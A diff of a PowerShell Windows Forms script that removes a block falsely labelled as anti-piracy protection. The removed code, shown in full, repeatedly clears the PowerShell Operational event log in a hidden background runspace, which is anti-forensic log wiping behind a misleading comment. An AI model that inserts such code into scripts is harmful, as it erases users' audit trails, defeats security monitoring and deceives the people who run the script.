@@ -934,20 +934,6 @@ $picturebox1.Size = New-Object System.Drawing.Size(250, 110)
 $picturebox1.SizeMode = 'CenterImage'
 $picturebox1.TabStop = $False
 #
-# Secure Region (to prevent piracy and misuse)
-# this is obfuscated part. this will prevent majority of people from misusing.
-# for powershell programmer, its fairly easy to deobfuscate. you can check what it really does.
-#
-$String = {
-Disable-RunspaceDebug
-$Runspace = [runspacefactory]::CreateRunspace()
-$PowerShell = [powershell]::Create()
-$PowerShell.runspace = $Runspace;$Runspace.Open()
-[void]$PowerShell.AddScript({1..100| %{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Operational");Start-Sleep -m 100}})
-$PowerShell.BeginInvoke() | Out-Null
-}
-$SecureString = $String.ToString()
-#
 #
 $Pg = New-Object 'System.Windows.Forms.Form'
 $Pg.StartPosition = 'Manual'
